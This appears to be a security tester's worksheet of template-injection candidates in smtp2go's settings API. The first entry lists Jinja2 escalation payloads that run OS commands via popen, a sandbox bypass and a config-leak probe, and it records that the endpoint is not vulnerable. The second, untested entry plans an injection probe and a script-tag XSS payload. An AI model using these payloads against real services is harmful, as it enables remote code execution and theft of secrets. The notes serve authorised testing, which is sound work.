# SSTI Candidates — smtp2go

---

## [SSTI-001] Template Render Endpoint — render-text with Jinja2

| Field | Value |
|---|---|
| **Source** | New CSV 2026-04-16, Account A session |
| **Method** | POST |
| **Endpoint** | `/api/settings/templates/?action=render-text` |
| **Template body** | User-controlled HTML with `{{ variable }}` syntax |
| **Template vars** | User-controlled JSON `template_variables` |
| **Backend** | Python/gunicorn (confirmed from `Server: gunicorn` header) |
| **Template syntax** | `{{ first_name }}` — confirmed Jinja2/Django style |
| **500 error on malformed input** | ✅ Confirmed — server-side rendering pipeline triggered |
| **Severity estimate** | ~~Critical~~ N/A — not Jinja2 |
| **Test status** | ❌ Not Vulnerable |

### Evidence
1. Template created with: `<p>Hello, {{ first_name }}!</p>` in `html_body`
2. `PUT /api/settings/templates/?action=create-template` → 200 OK, `user_template_id=1250783`
3. `POST /api/settings/templates/?action=render-text` with `user_template_id=1250783` and `template_variables={"first_name":"test"}` → would return `rendered_text: "<p>Hello, test!</p>"`
4. Same endpoint with malformed JSON in `template_variables` → HTTP 500 "internal error" — confirms server-side rendering pipeline reached

### Server stack evidence
```
Server: gunicorn                               ← Python WSGI
cookie: login_id=.eJwFw...                    ← Werkzeug/Flask signed cookie format
Session uses Flask-Login patterns              ← Flask + Jinja2 is default
Template syntax {{ var }} matches Jinja2 100%  ← Not Django (which uses {{ var }} too, but Flask default)
```

### Attack flow
```
1. Create/use template with body: {{config}}
2. POST /api/settings/templates/?action=render-text
   body: user_template_id=1250783&template_variables={}
3. If response contains Flask config dict → Jinja2 SSTI confirmed

Escalation payloads:
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Alternative vector: template_variables values
If template body is safe but `template_variables` values are rendered:
```json
{"first_name": "{{7*7}}"}
```
If rendered_text contains `49` → SSTI via variable values.

### Test plan
- [ ] Create template: `html_body=<p>{{7*7}}</p>`
- [ ] Call render-text with that template_id
- [ ] Does `rendered_text` contain `49`? → Jinja2 SSTI confirmed
- [ ] If yes: test `{{config}}` → leaks Flask config (SECRET_KEY etc.)
- [ ] If yes: test `{{''.__class__.__mro__}}` → confirm full Jinja2 (not sandbox)
- [ ] If sandbox: try `{{cycler.__init__.__globals__.os.popen('id').read()}}` (Jinja2 sandbox bypass)
- [ ] Also test injection via `template_variables`: `{"probe":"{{7*7}}"}`
- [ ] Test with `template_variables`: `{"probe":"${7*7}"}` — FreeMarker syntax test

### Why this is highest priority
- Backend is definitely Python/gunicorn → Jinja2 is the standard templating engine
- `{{ var }}` syntax confirmed in actual template content
- render-text endpoint exists explicitly to render templates server-side
- 500 error on malformed input = rendering pipeline triggered
- If unsandboxed Jinja2 → direct RCE

### Result
**❌ NOT VULNERABLE** — Template engine is **Handlebars/pybars** (Python Handlebars), NOT Jinja2.

Evidence:
- `html_body=RESULT:{{7*7}}:END` → `"Parse error on line 1: Lexer error Token: Error{\"Unexpected character in expression: '*'\"}`
- `{{7*7}}` fails at Lexer because `*` is not valid in Handlebars expressions
- Template variable values (`template_variables={"first_name":"{{7*7}}"}`) are treated as literals: `rendered_text="Hello, {{7*7}}!"`  
- `{{#each this}}` context shows ONLY the passed `template_variables` dict — no Flask config, no request object
- The `{{ first_name }}` syntax misled analysis — both Jinja2 AND Handlebars use `{{ }}` syntax

**Implication**: No SSTI/RCE via template body or template_variables. Handlebars sandbox is effective.

---

## [SSTI-002] SMTP User Feedback HTML — Stored Rendering in Emails

| Field | Value |
|---|---|
| **Source** | New CSV 2026-04-16 — smtp_users update-active-user |
| **Method** | POST |
| **Endpoint** | `/api/settings/smtp_users/?action=update-active-user` |
| **Key field** | `feedback_text` and `feedback_html` in request body |
| **Current value** | `feedback_html: "<br />\n<p><a href=\"%%UNSUBSCRIBE%%\">unsubscribe</a></p>"` |
| **Template substitution** | `%%UNSUBSCRIBE%%` suggests server-side substitution in email context |
| **Severity estimate** | Medium — may inject content into outgoing emails |
| **Test status** | ⬜ Untested |

### Evidence
```json
{
  "feedback_html": "<br />\n<p><a href=\"%%UNSUBSCRIBE%%\">unsubscribe</a></p>",
  "feedback_text": "To unsubscribe click: %%UNSUBSCRIBE%%"
}
```

The `%%UNSUBSCRIBE%%` marker is a custom template substitution applied when emails are sent. If the rendering happens server-side in the same Jinja2 context, `{{ var }}` injection here could also work.

### Test plan
- [ ] Set `feedback_html` to `<p>{{7*7}}</p>` and send a test email
- [ ] Check if the email contains `<p>49</p>` → Jinja2 SSTI in email rendering
- [ ] Try XSS: `feedback_html: <script>alert(1)</script>` — does it render in admin UI?

### Result
_Populate after testing._
